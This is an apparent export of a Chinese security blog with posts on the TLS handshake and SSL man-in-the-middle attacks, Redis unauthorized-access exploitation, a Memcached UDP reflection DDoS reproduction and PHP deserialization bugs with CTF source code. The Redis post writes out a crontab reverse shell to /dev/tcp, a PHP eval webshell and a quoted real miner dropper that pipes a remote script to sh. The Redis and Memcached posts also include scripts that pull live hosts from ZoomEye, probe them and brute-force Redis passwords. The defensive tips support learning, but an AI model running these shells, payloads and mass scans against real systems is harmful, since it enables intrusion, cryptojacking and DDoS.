随机数random_c，支持的密码套件cipher suites,压缩方法，扩展。如此包内容，提供了15个套件可供选择，使用null压缩算法（不使用）以及10个可供使用的extension Server Hello 服务器根据客户端发送的内容进行选择，这里返回了随机数random_s,选择的套件TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256，以及扩展 Certificate 服务器向客户端发送证书内容，包括其完整证书链，可以看到有2个证书，后者比前者等级高 src ip地址为baidu，我们用浏览器看下证书： 可以看到返回的两级证书链都被成功认证。 数字证书和数字签名：数字证书为有权威的CA机构颁发，如果出现问题，颁发机构会负全部责任。如上图，baidu.com的证书由GlobalSign Organization Validation CA - SHA256 - G2机构颁发，证书的内容包括目标公司信息，扩展，所使用算法，目标网站公钥，以及签发机构本身信息。其中的签名为颁发机构对certificate报文内容的散列值(例如SHA256)然后再用自身的私钥加密得到的结果。 验签：将获得的证书的hash值和用颁发机构公钥解密的签名值对比，相同则为正确。 Server key exchange 由于这里采用的是ECDHE算法，类似DH算法，所以需要密钥交换阶段，RSA算法是没有这步的 Server Hello Done 表示server hello 完成 Client Key Exchange,Change Cipher Spec,Encypted Handshake Message 这里分了三部分，第一部分是Client Key Exchange,如果是DH算法，则是发送交换密钥，如果是RSA则是使用服务器公钥加密随机数pre-master，与random_c、random_s共同构成协商密钥 第二部分是Change Cipher Spec，指此端之后的数据均为协商密钥加密的密文 第三部分是Encypted Handshake Message，为结合所有当前的通信参数信息生成一段数据，并使用协商密钥加密后的内容 New Session Ticket 会话标识符，解决会话缓存问题，这些数据采用一个只有服务器知道的密钥进行加密。Session Ticket由客户端进行存储，并可以在随后的一次会话中添加到 ClientHello消息的SessionTicket扩展中 Change Cipher Spec 表示服务器从现在开始发送加密信息 Encrypted Handshake Message 也叫Finished包，是完成协商密钥后的第一个加密信息包，用于验证密钥交换成功和认证成功。 使用该协商密钥加密之前所有收发握手消息的Hash和MAC值，发送给服务器，服务器将相同的会话密钥（使用相同方法生成）解密此消息，校验其中的Hash和MAC值。如果匹配，则成功。 Appication Data 数据传输，为应用层协议内容使用协商密钥加密结果 附一张DH算法的图 SSL中间人攻击目前的SSL中间人攻击分为两种: SSL劫持(欺骗)、SSL剥离(降级) SSL中间人劫持 SSL中间人劫持即攻击者首先通过ARP欺骗、DNS劫持甚至网关劫持等等，将客户端的访问重定向到攻击者的机器，让客户端机器与攻击者机器建立HTTPS连接（使用伪造证书），而攻击者机器再跟服务端连接。 这种情况由于证书是伪造的，所以证书认证会失败，浏览器会提示，如果不点继续是不会被劫持的，而一般用户由于安全意识比较淡薄，都会心甘情愿的上钩。 SSL剥离 该攻击方式主要是利用用户并不会每次都直接在浏览器上输入https://xxx.xxx.com来访问网站，或者有些网站并非全网HTTPS，而是只在需要进行敏感数据传输时才使用HTTPS的漏洞。 假如客户端直接访问HTTPS的URL，攻击者是没办法直接进行降级的，因为HTTPS与HTTP虽然都是TCP连接，但HTTPS在传输HTTP数据之前，需要在进行了SSL握手，并协商传输密钥用来后续的加密传输；假如客户端与攻击者进行SSL握手，而攻击者无法提供可信任的证书来让客户端验证通过进行连接，所以客户端的系统会判断为SSL握手失败，断开连接。 中间人攻击者在劫持了客户端与服务端的HTTP会话后，将HTTP页面里面所有的 https:// 超链接都换成 http:// ，用户在点击相应的链接时，是使用HTTP协议来进行访问；这样，就算服务器对相应的URL只支持HTTPS链接，但中间人一样可以和服务建立HTTPS连接之后，将数据使用HTTP协议转发给客户端，实现会话劫持。 由于使用HTTP，不会让浏览器出现HTTPS证书不可信的警告，而且用户很少会去看浏览器上的URL是 https:// 还是 http:// 。特别是App的WebView中，应用一般会把URL隐藏掉，用户根本无法直接查看到URL出现异常。 DDCTF 2018 流量分析下载流量包，打开后分析协议种类:发现由3部分，SMTP,FTP和SSL组成，先看FTP包：可以发现，发送了两个压缩包Fl-g.zip和sqlmap.zip，但数据大量丢包，无法复原出来。之后看SMTP，发现其发送了几封邮件，查看IMF协议内容：将Internet Message Format的内容以纯文本方式拷出来，然后保存为.eml文件，可以发现:发现是私钥，而其中还有SSL流量，从而推测用私钥去解密。根据图片生成私钥值，用图像识别去获取文字然后对照修改，看的眼睛都瞎了。。吐槽一下。最后倒入，即可在其中看见HTTP flag内容。]]></content>
      <categories>
        <category>protocol analysis</category>
      </categories>
      <tags>
        <tag>protocol analysis</tag>
        <tag>network security</tag>
        <tag>ssl/tls</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis 未授权访问漏洞利用分析]]></title>
    <url>%2Fblog%2Fredis-unauthorized-vulnerability%2F</url>
    <content type="text"><![CDATA[Redis一个ANSI C语言编写的key-value存储系统,和memcached相比,Redis支持数据的持久化,复杂的value类型(list，set，zset，hash)等以及数据的备份，即master-slave模式。 和memcached一样，操作非常简单，但redis支持在client、server同时操作，且只支持TCP协议。同样，默认的无认证机制和易暴露在公网的服务器,很容易造成威胁。以下是文章内容,主要对未授权漏洞的分析和利用复现，以及最后对含有此漏洞主机的挖掘: Redis 未授权访问漏洞 写入SSH公钥 反弹shell 写入webshell redis攻击实例分析 未授权访问漏洞挖掘 Redis 未授权访问漏洞和memcached类似，Redis默认在6379端口开放，且默认不需要提供认证。在低版本的Redis，没有对连接的用户进行限制，导致如果Redis暴露在互联网中，可以被任意人访问，修改数据库内容，造成极大危害。除了修改数据库外，由于Redis提供了备份的功能，通过修改备份文件路径，从而达到写入任意文件的目的。 在低版本中，protected-mode是不存在的，而默认的本机绑定也是不存在的，如下，是最新版的redis的配置文件，其添加了一个protected-mode和默认绑定127.0.0.1本地回路来防止安全问题： 123456789101112131415161718# ~~~ WARNING ~~~ If the computer running Redis is directly exposed to the# internet, binding to all the interfaces is dangerous and will expose the# instance to everybody on the internet. So by default we uncomment the# following bind directive, that will force Redis to listen only into# the IPv4 lookback interface address (this means Redis will be able to# accept connections only from clients running into the same computer it# is running).## IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES# JUST COMMENT THE FOLLOWING LINE.# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~bind 127.0.0.1...# By default protected mode is enabled. You should disable it only if# you are sure you want clients from other hosts to connect to Redis# even if no authentication is configured, nor a specific set of interfaces# are explicitly listed using the "bind" directive.protected-mode yes 可以看到Redis版本，服务器内核版本，配置文件绝对路径等信息。 可以使用keys *获取所有key值，并查看value 由于Redis不支持UDP协议，所以无法像memcached一样使用UDP反射，但由于提供了写文件,所以如果运行Redis用户权限足够高，会产生很严重的问题。 Redis 写入SSH公钥如果运行Redis的用户为root，可以通过写入authorized.keys文件来获取操作系统权限。 先生成公私钥对: 1ssh-keygen -t rsa 把生成的公钥前后加上换行\n，防止和save之后的缓存数据搞混，然后将其作为值传入key中： 然后将其作为evil字段的值传入redis中，使用-x参数,并修改Redis config的dir和dbfilename字段： 1./redis-cli -x 参数从标准输入读取数据作为该命令的最后一个参数 可以看到，公钥写入成功，尝试ssh登陆，由于我的Redis服务器是在kali上装的，默认关闭了ssh登陆功能，可以修改配置开启SSH登陆： 1234vim /etc/ssh/sshd_config将PermitRootLogin 改为 yes/etc/init.d/ssh start 然后使用私钥登陆服务器： 写入crontab定时任务crontab是一个定时任务执行程序，由于Redis未授权访问漏洞可以写入文件，通过向定时任务文件写入任务，从而执行命令。注意:仅在Centos下可以成功，Ubuntu/Debian会有权限和语法问题(这一点巨坑) crontab常见操作crontab是用于写入定时任务的，其一般分为两个地方: /var/spool/cron 这个目录一般是用户来写入定时任务的，注意的是Ubuntu/Debian的目录稍微有点不一样，是在/var/spool/cron/crontabs里面，只需要其目录下添加一个以$USER命名的文件，往此文件中写入任务即代表此用户的所有定时任务。同时直接使用crontab [option]命令也是对此目录下的文件和内容进行操作。 但要注意以下要点： 1234567891011121314151617181920[crontab操作]crontab -e # 编辑crontab -l # 查看当前用户的定时任务列表crontab -r # 删除当前用户的所有定时任务[权限问题]使用crontab -e 写入的文件权限是600而使用redis save写入文件的权限时644在Ubuntu/Debian上，定时任务文件的权限必须为600，否则会报错:(root) INSECURE MODE (mode 0600 expected) (crontabs/root)这也是这种命令注入方式无法在ubuntu上复现的原因[语法问题]由于redis写入文件时会添加上redis版本等内容，所以在ubuntu/debian中会因语法错误而报错忽略：(root) ERROR (Syntax error, this crontab file will be ignored)但在centos是可以执行的[命令格式]m h dom mon dow command* * * * * /usr/bin/curl http://xxxx.ceye.io etc/crontab 这个目录一般是管理员使用的，在这个内容中需要添加执行命令的用户 123456789SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )# redis写入crontab任务在centos下，由于crontab不需要严格的语法和权限，可以通过写入命令从而执行。如下，向定时任务中写入反弹shell 123set evil "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/ip_addr/port 0&gt;&amp;1\n\n"config set dir /var/spool/cronconfig set dbfilename root 写入webshell同样由于可以写入文件，而web脚本由于良好的容错性成为了首选shell注入点，以apache+php为例： 写入webshell: 12345678set evil "\n\n&lt;?php eval($_GET['evil']);?&gt;\n\n"+OKconfig set dir /var/www/html+OKconfig set dbfilename evil.php+OKsave+OK redis攻击实例分析接下来看一个在实际中利用的案例：案例来源于这里 实际反映: 云服务器上CPU满负荷，被通知，应该是被拿来挖矿 redis中写入了两个键值 12345[woxdtzfwar]*/1 * * * * /usr/bin/curl -fsSLhttp://172.104.190.64:8220/test11.sh | sh[crackit]ssh-rsaAAAAB3NzaC1yc2EAAAADAQABAAABAQDE0guChoiGr6s3mXjQA0wX6YKNNMy2bpj6b8ArjuWH/mjN17bu275t/ZlSarmMC5hCVAx7eJEzqxqy43AiBS61UuFpWZXWal5b6XWdvrH6pCJOI5+ceeFMEmc64B7GNrs2OPyuaP0HST/xh0YyWwoE/2uZmc3EyiR8sIP7/11N+xhHH4nIZB/M8QDaBRN6DWUNd/kzLDuIHr4LntuhKEZpCuQIuiDm7ZBYzbYhGtpPWnO04FzbfMUqP1JssTd/G/mUflRgQhKVACyF8rd8o/o7Zy6I9JVgLV6FpNOLc5Ep9VJuFXxmcxWc+Bj//Sd4pgn4gbmb8GzAvlH2xxw+SV2hredis@redis.io 可以看到一个写入了定时任务，另一个是公钥，他们的利用方法在上面都分析过了，看一下sh脚本内容: 123#!/bin/bash(ps auxf|grep -vgrep|grep minerd |awk '&#123;print $2&#125;'|xargs kill -9;crontab -r;pkill -9minerd;pkill -9 i586;pkill -9 gddr;echo &gt; /var/log/wtmp;history -c;cd ~;curl-L http://172.104.190.64:8220/minerd -o minerd;chmod +x minerd;setsid ./minerd-B -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u41e2vPcVux9NNeTfWe8TLK2UWxCXJvNyCQtNb69YEexdNs711jEaDRXWbwaVe4vUMveKAzAiA4j8xgUi29TpKXpm3zKTUYo-p x &amp;&gt;&gt;/dev/null) 分析一下脚本内容 查找删除了minerd进程，查了下minerd是挖矿的进程 清楚了当前用户的所有定时任务 再杀进程minerd i586 gddr 可能是之前的进程 清除日志 下载minerd挖矿程序，修改权限，运行自己的挖矿账号 Redis未授权访问漏洞挖掘这里的思路就是对运行redis的主机发送info命令，查看是否有返回配置内容，如若有授权，可以尝试字典破解。redis-cli会在命令发送接收中添加一些辅助字符，使用./redis-cli时会省略显示，构造时需要注意。为了模拟client，我们加入这些字符。 这里附上自己写的一个扫描脚本，从zoomeye获取运行Redis的主机和端口，然后进行TCP请求，如果发现需要授权密码，则使用字典进行破解。脚本具体使用方法可以看README 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# -*- coding: utf-8 -*-import socketimport requestsimport jsondef login(): data = &#123;"username": 'username', "password": 'password'&#125; r = requests.post('https://api.zoomeye.org/user/login', json=data) return json.loads(r.text)def verify(port, ip_addr, passwdlist): s = socket.socket() s.settimeout(5) try: s.connect((ip_addr, port)) payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a' s.send(payload.encode('utf-8')) recv_data = s.recv(512) if recv_data: if b'version' in recv_data: return True, '' elif b'NOAUTH' in recv_data: if passwdlist != '': with open(passwdlist, 'rb') as f: print('try to find the passwd for ' + ip_addr) passwds = f.readlines() for passwd in passwds: p = passwd.decode('utf-8').strip() passwd_payload = '*2\r\n$4\r\nauth\r\n$' + str(len(p)) + '\r\n' + p + '\r\n' s.send(passwd_payload.encode('utf-8')) pass_recv = s.recv(128) if pass_recv and 'OK' in pass_recv: s.send(payload.encode('utf-8')) retry_info_recv = s.recv(512) if b'version' in retry_info_recv: return True, passwd return False, '' else: return False, '' except Exception as e: print(e)def main(): token = login() headers = &#123;'Authorization': 'JWT ' + token['access_token']&#125; base_url = 'https://api.zoomeye.org/host/search?query=app:redis%20%2Bcountry:"CN"&amp;page=' passwdlist = '/path/to/wordlist' for i in range(1, 100): r = requests.get(url=base_url + str(i), headers=headers) res = json.loads(r.text) try: for x in res['matches']: ip_addr = x['ip'].strip() port = x['portinfo']['port'] print('-------\n' + ip_addr + ' ' + str(port)) flag, passwd = verify(port, ip_addr, passwdlist) if flag: with open('redis-res.txt', 'a+') as fw: fw.write(' '.join([ip_addr, port, passwd]) + '\n') except Exception as e: print(e)if __name__ == '__main__': main() 防御 修改默认端口 使用足够强壮的AUTH 配置bind 使用最小权限运行redis 禁止远程修改db文件地址]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Memcached UDP DDoS利用复现]]></title>
    <url>%2Fblog%2Fmemcached-ddos%2F</url>
    <content type="text"><![CDATA[Memcached 简介 Memcached是一种基于内存的key-value存储，用来存储小块的任意数据（字符串、对象）。这些数据可以是数据库调用、API调用或者是页面渲染的结果。它是一个简洁的key-value存储系统。一般的使用目的是，通过缓存数据库查询结果，减少数据库访问次数，以提高动态Web应用的速度、提高可扩展性。 具体的命令使用方法，可以在这里看到，非常简单，很容易学习上手。 UDP Reflection DDoSmemcached作为中间件，在之前爆出过整数溢出漏洞，详情可以看另一篇文章，而在最近，由于其低版本默认支持UDP协议，加上默认连接方式不需要认证，使得其可以通过利用，造成UDP Reflection DDoS，这里对其利用方式进行了复现。 这里总共有3台机子: memcached服务器 IP:192.168.1.100 正常用户 IP:192.168.1.101 攻击者 IP:192.168.1.103 其利用的主要流程如下: memcached 默认连接不需要身份认证，这成为了利用的潜在条件 memcached 低版本默认支持UDP协议，这成为了UDP DDoS的条件 在memcached中存储一个key字段很小，但value值很长的键值对，这提供了反射DDoS的可能 复现首先是服务器开启memcached并支持UDP协议，根据ConfiguringServer的说明,默认是开启的: UDP-Umodifies the UDP port, defaulting to on. UDP is useful for fetching or setting small items, not as useful for manipulating large items. Setting this to 0 will disable it, if you’re worried. 而由于memcached value值默认上线是1M，我们改为10M: 1memcached -u root -U 11211 -I 102400 -d 我们来测试下UDP连接是否可以,由官方手册可以看到，memcached自用协议使用UDP时需要加一个自定义的UDP header，具体参数如下,来源于这里： 12345678910111213141516171819202122232425262728293031323334353637383940UDP protocol------------For very large installations where the number of clients is high enoughthat the number of TCP connections causes scaling difficulties, there isalso a UDP-based interface. The UDP interface does not provide guaranteeddelivery, so should only be used for operations that aren't required tosucceed; typically it is used for "get" requests where a missing orincomplete response can simply be treated as a cache miss.Each UDP datagram contains a simple frame header, followed by data in thesame format as the TCP protocol described above. In the currentimplementation, requests must be contained in a single UDP datagram, butresponses may span several datagrams. (The only common requests that wouldspan multiple datagrams are huge multi-key "get" requests and "set"requests, both of which are more suitable to TCP transport for reliabilityreasons anyway.)The frame header is 8 bytes long, as follows (all values are 16-bit integersin network byte order, high byte first):0-1 Request ID2-3 Sequence number4-5 Total number of datagrams in this message6-7 Reserved for future use; must be 0The request ID is supplied by the client. Typically it will be amonotonically increasing value starting from a random seed, but the clientis free to use whatever request IDs it likes. The server's response willcontain the same ID as the incoming request. The client uses the request IDto differentiate between responses to outstanding requests if there areseveral pending from the same server; any datagrams with an unknown requestID are probably delayed responses to an earlier request and should bediscarded.The sequence number ranges from 0 to n-1, where n is the total number ofdatagrams in the message. The client should concatenate the payloads of thedatagrams for a given response in sequence number order; the resulting bytestream will contain a complete response in the same format as the TCPprotocol (including terminating \r\n sequences). 我们可以看到，需要加一个8bit的头部，由于我们只用发一条命令，所以4-5bit值为001其余均为0,使用通用命令stats，最终构造的payload: 1echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" |nc -u 192.168.1.100 11211 其中echo -n是不换行,echo -e是使用特殊字符,这也是这个漏洞的通用POC: 可以看到返回信息，说明此服务器可以利用。 那攻击者就可以连接此memcached服务器，给一个key设置一个很大的值，然后利用其udp反射造成DDoS。 给字段写入大量内容： 使用UDP去请求字段,可以看到返回内容非常多: 构造恶意数据包，指向正常用户源: 在用户端检测到了UDP反射的大量数据包，完成DDoS攻击： 漏洞挖掘使用zoomeye去扫描使用memcached组件的ip地址，然后使用poc去扫描，观察输出，如果有输出，则为可以利用的主机。 1echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" |nc -u ipaddr 11211 附上一个自己写的从zoomeye获取漏洞主机的代码. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# -*- coding: utf-8 -*-import reimport jsonimport requestsimport randomfrom scapy.all import *def login(): data = &#123;"username": "username", "password": "password"&#125; r = requests.post('https://api.zoomeye.org/user/login', json=data) return json.loads(r.text)def verify(recv): if len(recv[0].res) &gt; 0: content = (recv[0].res[0][1].original).decode('latin1') pattern = re.compile('(STAT|pid|uptime)') match = re.search(pattern, content) if match is not None: return True else: return Falsedef main(): token = login() headers = &#123;'Authorization': 'JWT ' + token['access_token']&#125; base_url = 'https://api.zoomeye.org/host/search?query=app:memcached%20%2Bcountry:"CN"&amp;page=' with open('mem-res.txt', 'w+') as fw: for i in range(1, 200): r = requests.get(url=base_url + str(i), headers=headers) res = json.loads(r.text) try: for x in res['matches']: ip_addr = x['ip'].strip() ip_pkt = IP(dst=ip_addr) udp_pkt = UDP( dport=11211, sport=random.randint(1025, 65535)) payload = '\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n' pkt = ip_pkt / udp_pkt / payload recv = sr(pkt, timeout=5) if verify(recv): fw.write(ip_addr + '\n') except Exception as e: print(e)if __name__ == '__main__': main() 防御 使用最新版memcached 绑定监听IP，使用IP白名单或绑定本地回路 使用最小权限运行memcached 修改默认端口 启用SASL认证 关闭UDP协议支持]]></content>
      <categories>
        <category>vulnerability analysis</category>
      </categories>
      <tags>
        <tag>vulnerability analysis</tag>
        <tag>Memcached</tag>
        <tag>DDoS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化相关漏洞总结[CVE-2016-7124、SugarCRM、session 反序列化、HITCON 2016]]]></title>
    <url>%2Fblog%2Fphp-deserialization%2F</url>
    <content type="text"><![CDATA[在做题中，遇见了不止一次反序列化相关的内容，在这里做一个总结。 PHP 序列化/反序列化 CVE-2016-7124 SugarCRM PHP反序列化漏洞 HITCON 2016 web 审计 session反序列化相关 serialize / unserialize编程语言一般都会提供序列化和反序列化的功能，从而使得对象和字符串进行相互转换，从而完成持久化，PHP提供了serialize和unserialize，python提供了pickle.dumps()和pickle.loads(),以PHP为例： 1234567891011121314151617181920212223class item&#123; private $date; private $price; private $name; private $a=array(); public function __construct($name) &#123; $this-&gt;name = $name; &#125; function set_price($price)&#123; $this-&gt;price = $price; &#125; function set_array($args)&#123; $this-&gt;a=$args; &#125;&#125;$i = new item('apple');$i-&gt;set_array(array('s1','s2','s3'));echo serialize($i); 运行后可以看到结果: 1O:4:"item":4:&#123;s:10:"itemdate";N;s:11:"itemprice";N;s:10:"itemname";s:5:"apple";s:7:"itema";a:3:&#123;i:0;s:2:"s1";i:1;s:2:"s2";i:2;s:2:"s3";&#125;&#125; 仔细的人会发现，itemdate部分为什么长度是10，不应该是8吗？，这一点非常坑，我们把它用文件输出然后拖到hex里面看看，可以发现，其类名和变量名之前都添加了%00字符，而在终端中是没办法赋值%00字符的，导致问题的出现，所以对于反序列化的操作，最好放到文件中，不要从终端直接操作，如果谁有可以复制的，请mail推荐给我！ iterm2好像不行: 当然，支持多种类型的PHP变量integers / floats / boolean/ strings / array / objects具体的字段含义如下: 12345678910111213141516171819202122[boolean]b:;b:1; // Trueb:0; // False[int]i:;i:1; // 1i:-3; // -3[object]O:strlen(object name):object name:object size:&#123;s:strlen(property name):property name:property definition;(repeated per property)&#125;其中object size 等于对象的变量数[NULL]N; //NULL[string]s:5:"hello"; //s:size:value;[array]a:3:&#123;s"key1";s"value1";s"value2";&#125; //a:size:&#123;key, value pairs&#125;; 要从字符串中反序列化得到object只需要调用unserialize($str)即可。 反序列化漏洞一般是对输入进行反序列化$obj=unserialize($_GET[&#39;object&#39;])，但仅仅将字符串反序列化为对象并没有什么用，还需要利用魔术方法或者其他敏感函数进行恶意操作 __sleep &amp; __wakeup两个魔术方法，当一个对象被序列化时，PHP会调用__sleep方法(如果有的话)，这个功能可以用于清理对象，并返回一个包含对象中变量名称的数组，例如下面例子，我们在序列化的过程中，清楚掉$id字段内容: 1234567891011121314151617181920212223&lt;?phpclass item&#123; private $id; private $name; public function __construct($name) &#123; $this-&gt;name = $name; $this-&gt;id = uniqid(); &#125; function __sleep()&#123; return array('name'); &#125;&#125;$i = new item('apple');echo serialize($i);?&gt;结果为:O:4:"item":1:&#123;s:10:"itemname";s:5:"apple";&#125;可以看到id信息被抹去了 而同理，__wakeup用于反序列化的相关操作，比如数据库重新连接，变量初始化等内容。 123456789101112131415161718192021222324252627282930&lt;?phpclass item&#123; private $id; private $name; public function __construct($name) &#123; $this-&gt;name = $name; $this-&gt;id = uniqid(); &#125; function __sleep()&#123; return array('name'); &#125; function __wakeup()&#123; $this-&gt;id = uniqid(); &#125;&#125;$i = new item('ban');$str = serialize($i);$obj = unserialize($str);var_dump($obj);?&gt;结果:object(item)#2 (2) &#123; ["id":"item":private]=&gt; string(13) "5ac4e794dc058" ["name":"item":private]=&gt; string(3) "ban"&#125; 可以看到，反序列化时，调用了__wakeup函数进行了变量赋值。 利用其他程序逻辑比如，以下代码: 123456789101112class User &#123; public $age = 0; public $name = ''; public function __toString()&#123; return 'User ' . $this-&gt;name . ' is ' . $this-&gt;age . ' years old. &lt;br /&gt;'; &#125; &#125; $obj = unserialize($_GET['evil']); echo $obj; 在原始逻辑中对反序列化的对象进行了某些操作，然后造成可以利用。这种方式不仅限于魔术方法，还包括正常逻辑的函数。对于__toString()来说，不只只有echo $obj的时候才会触发，其他的例如字符串拼接、格式化字符串、字符串比较、in_array()等等，当然在针对对象的操作中，例如class_exists()、对象创建、对象执行、对象销毁都可能触发。 CVE-2016-7124__wakeup一般用于数据反序列化的清理,CVE-2016-7124发现，在PHP低版本中，当输入的反序列化的对象个数大于真实的个数时，会使得__wakeup函数失效从而可以绕过,同时对象被销毁，执行__destruct().所以攻击者可以绕过__wakeup调用精心设计的__destruct()方法 影响版本: PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10 首先看正常的反序列化内容结果: 1234567891011121314151617181920212223242526272829&lt;?phpclass User &#123; public $age; public $name; function __construct($name)&#123; $this-&gt;name = $name; &#125; function __destruct()&#123; echo "destruct\n"; echo $this-&gt;name; &#125; function __wakeup()&#123; echo "wakeup\n"; echo $this-&gt;name; $this-&gt;name = ""; &#125;&#125;// $user = new User('test');// $str = serialize($user);// $file = fopen('file.txt','w');// fwrite($file, $str);$str = file_get_contents('file.txt');$obj = unserialize($str);var_dump( $obj);?&gt; 输出结果为: 123456789wakeuptestobject(User)#1 (2) &#123; ["age"]=&gt; NULL ["name"]=&gt; string(0) ""&#125;destruct 我们可以看到__wakeup()调用的时候，对象已经被创建成功，然后对name字段进行清理，然后调用var_dump发现反序列化后的对象数据确实干净，最终程序执行完成退出时，调用__destruct()销毁对象。 我们将file.txt文件内容改为O:4:&quot;User&quot;:3:{s:3:&quot;age&quot;;N;s:4:&quot;name&quot;;s:4:&quot;test&quot;;} (属性个数2改为了3),我们看在不同版本php下的结果： 123456[php 5.4.45]Notice: unserialize(): Unexpected end of serialized data in C:\phpStudy\PHPTutorial\WWW\index.php on line 27 destruct test Notice: unserialize(): Error at offset 48 of 49 bytes in C:\phpStudy\PHPTutorial\WWW\index.php on line 27 bool(false)[php 7.1.7]bool(false) 可以看到 绕过了__wakeup()的清理，并执行了__destruct()方法 SugarCRM v6.5.23 PHP反序列化漏洞由于sugarCRM这个开源项目已经被删除了，所以没办法复现了…尴尬 那么就根据文章来学习一下好了参考文章为这篇：SugarCRM v6.5.23 PHP反序列化 对象注入漏洞 具体的写的非常清晰，总结一下： 主要利用的是被反序列化字符串过滤正则的不完善,(其本身意图想过滤所有对象类型，但o:4-&gt;o:+4，使用加号可以绕过)和php低版本__wakeup()的绕过，最终寻找到一个__destruct()方法调用了写入文件，从而可以将payload恶意内容写入，使用的是SugarCacheFile对象 观察其补丁： 12345678function sugar_unserialize($value)&#123; preg_match('/[oc]:[^:]*\d+:/i', $value, $matches); if (count($matches)) &#123; return false; &#125; return unserialize($value);&#125; 更改了正则表达式，无法反序列化对象内容 HITCON 2016 web 审计一道源码审计，基于注入和反序列化，源码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183&lt;?phpinclude "config.php";class HITCON&#123; private $method; private $args; private $conn; public function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); &#125; function show() &#123; list($username) = func_get_args(); $sql = sprintf("SELECT * FROM users WHERE username='%s'", $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) &#123; $this-&gt;__die( sprintf("%s is %s", $obj-&gt;username, $obj-&gt;role) ); &#125; else &#123; $this-&gt;__die("Nobody Nobody But You!"); &#125; &#125; function login() &#123; global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf("SELECT * FROM users WHERE username='%s' AND password='%s'", $username, $password); if ( $username == 'orange' || stripos($sql, 'orange') != false ) &#123; $this-&gt;__die("Orange is so shy. He do not want to see you."); &#125; $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == 'admin' ) &#123; $this-&gt;__die("Hi, Orange! Here is your flag: " . $FLAG); &#125; else &#123; $this-&gt;__die("Admin only!"); &#125; &#125; function source() &#123; highlight_file(__FILE__); &#125; function __conn() &#123; global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) &#123; $sql = "CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8"; $this-&gt;__query($sql, $back=false); $sql = "INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"; $this-&gt;__query($sql, $back=false); &#125; mysql_query("SET names utf8"); mysql_query("SET sql_mode = 'strict_all_tables'"); &#125; function __query($sql, $back=true) &#123; $result = @mysql_query($sql); if ($back) &#123; return @mysql_fetch_object($result); &#125; &#125; function __die($msg) &#123; $this-&gt;__close(); header("Content-Type: application/json"); die( json_encode( array("msg"=&gt; $msg) ) ); &#125; function __close() &#123; mysql_close($this-&gt;conn); &#125; function __destruct() &#123; $this-&gt;__conn(); if (in_array($this-&gt;method, array("show", "login", "source"))) &#123; @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; else &#123; $this-&gt;__die("What do you do?"); &#125; $this-&gt;__close(); &#125; function __wakeup() &#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); &#125; &#125;&#125;if(isset($_GET["data"])) &#123; @unserialize($_GET["data"]); &#125; else &#123; new HITCON("source", array());&#125; 好吧，代码有点长，我们一点点分析。 看完代码，发现flag在login函数中，得到flag的方式，需要使得login方法中$obj不为空且为admin，但上面由于: 12345if ( $username == 'orange' || stripos($sql, 'orange') != false ) &#123; $this-&gt;__die("Orange is so shy. He do not want to see you."); &#125; 看起来是矛盾的，这里发现php字符编码不是UTF-8，可以用Ą、Ã绕过。为了获得orange密码，可以发现在show函数中存在注入点，$username没有过滤，而在__wakeup()中对字符进行了转义，可以使用之前CVE的方式使其失效，然后刚好可以利用__destruct()进行执行。这样就得出了整道题的思路。 session反序列化相关关于php session的资料网上有很多，可以去搜一下，这里总结一下相关字段的含义: 字段 含义 常见值 额外说明 Registered save handlers 支持的session存储类型 files user sqlite memcache 可保存为文件、用户定义、数据库或memcached(在内存中存储seesion) Registered serializer handlers 支持的seesion序列环类型 php php_binary wddx php类型格式为:键值+&#124;+序列化内容php_serialize格式为：序列化内容 session.auto_start 是否自动创建session on/off on的时候不需要调用session_start()，自动添加 session.cache_expire 当前缓存的到期时间 180分钟 session.cache_limiter 缓存限制器 public、private、private_no_expire、nocache session.cookie_domain cookie支持的域名 